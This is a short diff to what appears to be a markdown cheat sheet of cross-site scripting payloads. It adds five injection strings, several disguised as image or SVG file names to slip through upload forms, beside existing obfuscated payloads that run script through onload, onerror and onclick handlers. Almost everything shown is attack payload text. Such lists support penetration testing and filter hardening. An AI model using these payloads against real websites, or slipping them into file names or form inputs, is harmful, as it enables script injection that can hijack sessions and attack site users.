@@ -104,6 +104,11 @@ javascript:{alert`0`}
 <a69/onclick=write&lpar;&rpar;>hi
 <svg/onload=self[`aler`%2b`t`]`1`>
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
 ```
 
 ## XSS + SSRF <br>
